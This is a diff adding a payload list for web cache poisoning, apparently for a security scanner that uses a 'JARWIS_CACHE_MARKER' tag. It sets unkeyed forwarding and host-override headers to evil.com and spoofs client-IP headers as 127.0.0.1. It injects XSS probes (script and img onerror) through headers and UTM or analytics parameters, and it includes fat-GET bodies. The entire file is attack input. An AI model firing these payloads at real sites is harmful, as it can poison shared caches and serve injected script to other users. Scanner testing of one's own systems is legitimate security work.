@@ -1,0 +1,101 @@
+# Web Cache Poisoning Payloads
+# Unkeyed headers and parameters for cache poisoning attacks
+
+# ====================================
+# Unkeyed Headers (X-Forwarded-*)
+# ====================================
+
+# X-Forwarded-Host - Most common cache poisoning vector
+X-Forwarded-Host: evil.com
+X-Forwarded-Host: JARWIS_CACHE_MARKER.evil.com
+
+# X-Forwarded-Server
+X-Forwarded-Server: evil.com
+X-Forwarded-Server: JARWIS_CACHE_MARKER.evil.com
+
+# X-Forwarded-Scheme/Proto
+X-Forwarded-Scheme: http
+X-Forwarded-Proto: http
+X-Forwarded-Proto: https
+
+# X-Forwarded-Port
+X-Forwarded-Port: 443
+X-Forwarded-Port: 8080
+
+# X-Forwarded-Prefix
+X-Forwarded-Prefix: /JARWIS_CACHE_MARKER
+
+# ====================================
+# URL Rewrite Headers
+# ====================================
+
+X-Original-URL: /JARWIS_CACHE_MARKER
+X-Rewrite-URL: /JARWIS_CACHE_MARKER
+X-Original-Host: evil.com
+X-Original-Path: /JARWIS_CACHE_MARKER
+
+# ====================================
+# Host Override Headers
+# ====================================
+
+X-Host: evil.com
+X-HTTP-Host-Override: evil.com
+X-Forwarded-Host: evil.com
+Forwarded: host=evil.com
+
+# ====================================
+# Debug/Special Headers
+# ====================================
+
+X-Real-IP: 127.0.0.1
+True-Client-IP: 127.0.0.1
+Fastly-Client-IP: 127.0.0.1
+CF-Connecting-IP: 127.0.0.1
+X-Azure-ClientIP: 127.0.0.1
+
+# ====================================
+# XSS via Cache Headers
+# ====================================
+
+X-Forwarded-Host: "><script>alert(1)</script>.evil.com
+X-Original-URL: "><script>alert(1)</script>
+X-Forwarded-Prefix: "><script>alert(1)</script>
+X-Host: "><img src=x onerror=alert(1)>.evil.com
+
+# ====================================
+# Parameter Cloaking (often excluded from cache key)
+# ====================================
+
+# UTM parameters
+utm_source="><script>alert(1)</script>
+utm_medium="><script>alert(1)</script>
+utm_campaign="><script>alert(1)</script>
+utm_content="><script>alert(1)</script>
+utm_term="><script>alert(1)</script>
+
+# Analytics/tracking
+fbclid="><script>alert(1)</script>
+gclid="><script>alert(1)</script>
+_ga="><script>alert(1)</script>
+mc_cid="><script>alert(1)</script>
+mc_eid="><script>alert(1)</script>
+
+# Cache control params (often stripped)
+_=JARWIS_CACHE_MARKER
+cb=JARWIS_CACHE_MARKER
+nocache=1
+cache=false
+timestamp=1234567890
+
+# ====================================
+# Fat GET Request (body in GET)
+# ====================================
+
+# JSON body in GET
+{"test": "JARWIS_CACHE_MARKER"}
+
+# Form body in GET
+test=JARWIS_CACHE_MARKER
+
+# XML body in GET
+<test>JARWIS_CACHE_MARKER</test>
